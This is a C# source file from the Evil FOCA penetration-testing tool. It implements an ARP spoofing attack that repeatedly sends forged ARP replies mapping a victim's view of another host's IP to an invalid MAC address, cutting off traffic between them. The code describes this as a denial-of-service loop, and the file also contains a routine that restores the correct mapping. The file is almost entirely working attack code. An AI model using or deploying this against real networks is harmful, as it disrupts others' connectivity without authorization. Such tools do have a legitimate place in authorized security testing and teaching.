/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.NetworkInformation;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap.WinPcap;
using System.Threading;
using evilfoca.Data;

namespace evilfoca.Attacks
{
    class InvalidMacSpoofIPV4
    {
        private const int SendDoSAttackEachXSecs = 5; //120
        private WinPcapDevice device;
        private Thread threadAttack;
        private SynchronizedCollection<Data.Attack> attacks;

        public InvalidMacSpoofIPV4(WinPcapDevice device, SynchronizedCollection<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
        }

        public void Start()
        {
            threadAttack = new Thread(new ThreadStart(Attack));
            threadAttack.IsBackground = true;
            threadAttack.Start();
        }

        void pasiveScan_NewARP(object sender, Core.ArpEventArgs e)
        {
            if (e.p == null)
                return;
            Packet p = e.p;
            if (!(p.PayloadPacket is ARPPacket))
                return;

            ARPPacket arp = (ARPPacket)p.PayloadPacket;


            foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.InvalidMacSpoofIpv4 && A.attackStatus == Data.AttackStatus.Attacking))
            {
                if (attack is InvalidMacSpoofAttackIpv4Attack)
                {
                    InvalidMacSpoofAttackIpv4Attack spoofAttack = (InvalidMacSpoofAttackIpv4Attack)attack;
                    if ((spoofAttack.t1.mac.Equals(arp.SenderHardwareAddress)) && arp.TargetProtocolAddress.Equals(spoofAttack.t2.ip))
                    {
                        ForceAttack(spoofAttack);
                    }

                }
            }
        }

        private void Attack()
        {
            while (true)
            {

                try
                {
                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.InvalidMacSpoofIpv4 && A.attackStatus == Data.AttackStatus.Attacking))
                    {
                        if (attack is InvalidMacSpoofAttackIpv4Attack)
                        {
                            ForceAttack((InvalidMacSpoofAttackIpv4Attack)attack);
                        }
                    }

                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.InvalidMacSpoofIpv4 && A.attackStatus == Data.AttackStatus.Stopping))
                    {
                        if (attack is InvalidMacSpoofAttackIpv4Attack)
                        {
                            ForceRestore((InvalidMacSpoofAttackIpv4Attack)attack);
                            attack.attackStatus = AttackStatus.Stop;
                        }
                    }

                    Thread.Sleep(SendDoSAttackEachXSecs * 1000);
                }
                catch (ThreadAbortException)
                {
                    return;
                }
                catch
                {
                }
            }
        }

        public void ForceAttack(InvalidMacSpoofAttackIpv4Attack attack)
        {
            EthernetPacket ethernet;
            ethernet = new EthernetPacket(device.Interface.MacAddress, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.mac, EthernetPacketType.Arp);
            ethernet.PayloadPacket = new ARPPacket(ARPOperation.Response, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.mac, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.ip, ((InvalidMacSpoofAttackIpv4Attack)attack).invalidMac, ((InvalidMacSpoofAttackIpv4Attack)attack).t2.ip);
            Program.CurrentProject.data.SendPacket(ethernet);
        }

        public void ForceRestore(InvalidMacSpoofAttackIpv4Attack attack)
        {
            EthernetPacket ethernet;
            ethernet = new EthernetPacket(device.Interface.MacAddress, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.mac, EthernetPacketType.Arp);
            ethernet.PayloadPacket = new ARPPacket(ARPOperation.Response, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.mac, ((InvalidMacSpoofAttackIpv4Attack)attack).t1.ip, ((InvalidMacSpoofAttackIpv4Attack)attack).t2.mac, ((InvalidMacSpoofAttackIpv4Attack)attack).t2.ip);
            Program.CurrentProject.data.SendPacket(ethernet);
        }

        public void Stop()
        {
            if (threadAttack != null && threadAttack.IsAlive)
            {
                threadAttack.Abort();
                threadAttack = null;
            }
        }
    }
}
